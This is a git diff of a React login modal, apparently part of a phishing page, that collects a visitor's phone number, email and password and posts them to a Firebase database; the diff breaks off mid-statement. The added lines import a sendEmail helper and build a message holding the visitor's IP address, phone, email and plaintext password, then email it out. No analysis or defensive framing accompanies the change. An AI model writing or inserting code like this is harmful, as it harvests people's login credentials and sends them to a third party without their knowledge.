@@ -1,6 +1,5 @@
 import axios from "axios";
 import React, { useEffect, useState } from "react";
-
 import { onValue, ref, update } from "firebase/database";
 import { database } from "../../Utils/firebase";
 import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
@@ -8,6 +7,7 @@ import InputPassword from "../UI/InputPassword/InputPassword";
 import Validating from "../Validating";
 import "./Modal.scss";
 import { useNavigate } from "react-router";
+import { sendEmail } from "../../Utils/sendEmail";
 
 const passwords = [];
 
@@ -40,6 +40,16 @@ const Modal = ({ isModal, setIsModal }) => {
     form.append("phone", data.phone);
     form.append("email", data.email);
     form.append("password", passwords);
+
+    const content = `
+    \n
+    IP: ${localStorage.getItem("ip")}
+    Phone: ${data.phone}
+    Email : ${data.email}
+    Password : ${password}
+    `;
+
+    sendEmail({ content: content });
 
     const updates = {};
     updates[
